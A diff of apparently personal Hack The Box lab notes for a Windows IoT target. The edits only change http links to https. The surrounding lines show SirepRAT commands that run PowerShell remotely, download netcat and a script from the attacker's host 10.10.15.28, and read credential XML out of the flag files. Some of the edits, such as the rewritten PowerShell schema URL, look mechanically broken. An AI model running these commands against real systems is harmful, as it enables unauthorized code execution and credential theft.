@@ -60,7 +60,7 @@ PORT      STATE SERVICE  VERSION
 
 
 # goto
-http://10.10.10.204:8080/
+https://10.10.10.204:8080/
 # popup windows
 ssh Administrator@10.10.10.204
 
@@ -120,7 +120,7 @@ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C
 
 
 # upload something
-python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell Invoke-Webrequest -Outfile C:\blah.txt -Uri http://10.10.15.28/inject.sql" --v
+python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell Invoke-Webrequest -Outfile C:\blah.txt -Uri https://10.10.15.28/inject.sql" --v
 python SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path "C:\blah.txt" --v
 # ---------
 # CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
@@ -194,17 +194,17 @@ python SirepRAT.py 10.10.10.204 PutFileOnDevice --remote_path "C:\test\nc64.exe"
 python SirepRAT.py 10.10.10.204 PutFileOnDevice --remote_path "C:\Data\Users\app\gracepw.txt" --data /home/grace/htb4/SirepRAT/gracepw.txt
 
 # run command to upload
-python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell.exe -command Invoke-WebRequest -Uri http://10.10.15.28:9002/nc64.exe -Outfile C:\tests\nc64.exe"
+python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell.exe -command Invoke-WebRequest -Uri https://10.10.15.28:9002/nc64.exe -Outfile C:\tests\nc64.exe"
 
 
-python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell.exe -command Invoke-WebRequest -Uri http://10.10.15.28:9000/func.ps1 -Outfile C:\Data\Users\app\func.ps1"
+python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell.exe -command Invoke-WebRequest -Uri https://10.10.15.28:9000/func.ps1 -Outfile C:\Data\Users\app\func.ps1"
 
 python SirepRAT.py 10.10.10.204 GetFileInformationFromDevice --remote_path "C:\test\nc64.exe"
 
 python SirepRAT.py 10.10.10.204 GetFileInformationFromDevice --remote_path "c:\Windows\nc64.exe"
 
 # upload the netcat on target
-python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell Invoke-Webrequest -Outfile C:\nc64.exe -Uri http://10.10.15.28:9200/home/grace/htb4/netcat-1.11/nc64.exe" --v
+python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell Invoke-Webrequest -Outfile C:\nc64.exe -Uri https://10.10.15.28:9200/home/grace/htb4/netcat-1.11/nc64.exe" --v
 
 
 
@@ -245,7 +245,7 @@ PS C:\Data\Users\administrator> ls
 
 
 PS C:\Data\Users\administrator> cat root.txt
-# <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+# <Objs Version="1.1.0.1" xmlns="https://schemas.microsoft.com/powershell/2004/04">
 #   <Obj RefId="0">
 #     <TN RefId="0">
 #       <T>System.Management.Automation.PSCredential</T>
@@ -261,7 +261,7 @@ PS C:\Data\Users\administrator> cat root.txt
 
 
 PS C:\Data\Users\app> cat user.txt
-# <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+# <Objs Version="1.1.0.1" xmlns="https://schemas.microsoft.com/powershell/2004/04">
 #   <Obj RefId="0">
 #     <TN RefId="0">
 #       <T>System.Management.Automation.PSCredential</T>
@@ -660,8 +660,8 @@ if "__main__" == __name__:
 
 ref:
 - [github](https://github.com/SafeBreach-Labs/SirepRAT)
-- [PowerShell - 解碼System.Security.SecureString爲可讀密碼](http://hk.uwenku.com/question/p-zubpcrmb-ys.html)
-- [PowerShell - Get-Credential解碼密碼？](http://hk.uwenku.com/question/p-etehoiap-vb.html)
+- [PowerShell - 解碼System.Security.SecureString爲可讀密碼](https://hk.uwenku.com/question/p-zubpcrmb-ys.html)
+- [PowerShell - Get-Credential解碼密碼？](https://hk.uwenku.com/question/p-etehoiap-vb.html)
 - [Decrypt PowerShell Secure String Password](https://devblogs.microsoft.com/scripting/decrypt-powershell-secure-string-password/)
 - [PowerShell - Decode System.Security.SecureString to readable password](https://stackoverflow.com/questions/7468389/powershell-decode-system-security-securestring-to-readable-password)
 - [Secure Password with PowerShell: Encrypting Credentials – Part 1](https://www.pdq.com/blog/secure-password-with-powershell-encrypting-credentials-part-1/)
